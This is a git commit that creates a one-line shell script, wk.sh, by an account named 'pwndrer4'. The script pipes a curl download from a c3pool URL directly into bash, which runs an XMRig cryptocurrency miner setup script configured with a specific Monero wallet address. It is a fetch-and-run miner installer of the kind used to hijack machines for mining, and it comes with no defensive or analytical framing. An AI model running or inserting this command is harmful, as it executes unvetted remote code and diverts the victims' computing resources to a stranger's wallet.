32790d49baa3d60a136966c210de3f3aae6cd004
pwndrer4 <53749719+pwndrer4@users.noreply.github.com>
2023-01-24 19:25:16 +0800

    Create wk.sh

---
+++ wk.sh
@@ -0,0 +1,1 @@
+curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 47uxCw5cRRr2e3TQ3uWecfiTB3XGjdh68LfXuhCY4vV8cR9LatsbJjMSY52GT6jRGbAokWbpKWoveExnRZQMquxLPehMzXp
